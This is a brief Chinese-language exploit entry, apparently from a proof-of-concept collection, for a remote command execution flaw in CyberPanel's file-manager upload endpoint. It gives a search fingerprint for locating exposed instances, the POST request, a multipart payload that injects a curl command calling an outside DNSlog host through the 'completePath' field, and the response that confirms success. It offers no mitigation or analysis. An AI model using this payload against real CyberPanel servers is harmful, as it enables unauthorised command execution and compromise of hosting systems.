# Cyber​​Panelupload远程命令执行漏洞

Cyber​​Panelupload ｜ 命令执行 ｜ —
- **指纹**：`app="CyberPanel"`
- **请求**：`POST /filemanager/upload HTTP/1.1`

**Payload**
```
------NewBoundary123456789
Content-Disposition: form-data; name="domainName"
<target>
------NewBoundary123456789
Content-Disposition: form-data; name="completePath"
curl [http://dtrz.dnslog.cn/](http://dtrz.dnslog.cn/)
------NewBoundary123456789
Content-Disposition: form-data; name="file"; filename="poc.txt"
pwn
------NewBoundary123456789--
```
- **响应特征**：200 Dnslog回显